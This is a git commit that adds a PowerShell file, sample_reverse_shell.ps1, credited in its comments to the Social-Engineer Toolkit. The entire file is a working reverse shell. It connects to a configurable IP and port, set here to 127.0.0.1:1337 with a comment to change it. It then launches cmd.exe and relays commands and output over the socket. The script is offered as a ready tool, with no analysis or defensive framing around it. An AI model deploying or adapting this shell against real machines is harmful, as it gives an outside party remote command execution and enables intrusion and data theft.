274d49001e6f14737177814de093a757072a7003
ahhh <ahhh.db@gmail.com>
2015-07-20 17:23:09 -0700

    Create sample_reverse_shell.ps1

---
+++ sample_reverse_shell.ps1
@@ -0,0 +1,55 @@
+# Script for playing with a reverseshell in PowerShell
+# Taken from SET: https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/powershell/reverse.powershell
+
+# Set your IP Address and Port
+$address = '127.0.0.1'
+$port = '1337'
+
+# Cleanup Function
+function cleanup {
+if ($client.Connected -eq $true) {$client.Close()}
+if ($process.ExitCode -ne $null) {$process.Close()}
+exit}
+
+# Create network connection
+$client = New-Object system.net.sockets.tcpclient
+$client.connect($address,$port)
+$stream = $client.GetStream()
+$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
+
+# Start cmd shell process
+$process = New-Object System.Diagnostics.Process
+$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
+$process.StartInfo.RedirectStandardInput = 1
+$process.StartInfo.RedirectStandardOutput = 1
+$process.StartInfo.UseShellExecute = 0
+$process.Start()
+$inputstream = $process.StandardInput
+$outputstream = $process.StandardOutput
+
+start-sleep 1
+$encoding = new-object System.Text.AsciiEncoding
+while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
+$stream.Write($encoding.GetBytes($out),0,$out.Length)
+$out = $null; $done = $false; $testing = 0;
+while (-not $done) {
+if ($client.Connected -ne $true) 
+{cleanup}
+$pos = 0; $i = 1
+while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
+$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
+$pos+=$read; 
+if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}
+}
+if ($pos -gt 0) {
+$string = $encoding.GetString($networkbuffer,0,$pos)
+$inputstream.write($string)
+start-sleep 1
+if ($process.ExitCode -ne $null) {cleanup}
+else {
+$out = $encoding.GetString($outputstream.Read())
+while($outputstream.Peek() -ne -1){
+$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
+$stream.Write($encoding.GetBytes($out),0,$out.length)
+$out = $null
+$string = $null}} else {cleanup}}
